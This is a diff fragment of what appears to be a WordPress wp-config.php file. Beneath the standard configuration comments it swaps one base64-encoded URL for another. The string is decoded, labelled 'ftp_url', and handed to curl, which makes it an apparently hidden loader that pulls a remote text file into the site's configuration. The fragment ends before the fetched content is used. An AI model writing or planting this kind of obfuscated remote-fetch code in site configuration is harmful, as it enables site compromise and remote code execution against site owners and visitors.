@@ -65,7 +65,7 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * You can have multiple installations in one database if you give each
  * a unique prefix. Only numbers, letters, and underscores please!
  */
-$ftp_url_base64 = "aHR0cHM6Ly9naXRodWIuY29tL29ubHltZTFkL2R4ZXJyb3IvcmF3L3JlZnMvaGVhZHMvbWFpbi94ZHNwaWRlci50eHQ=";
+$ftp_url_base64 = "aHR0cHM6Ly9pZGlpYS5nb3YuYW8vYXBvbHNoZWwudHh0";
 $ftp_url = base64_decode($ftp_url_base64); 
 $cu = curl_init();
 curl_setopt_array($cu, array(
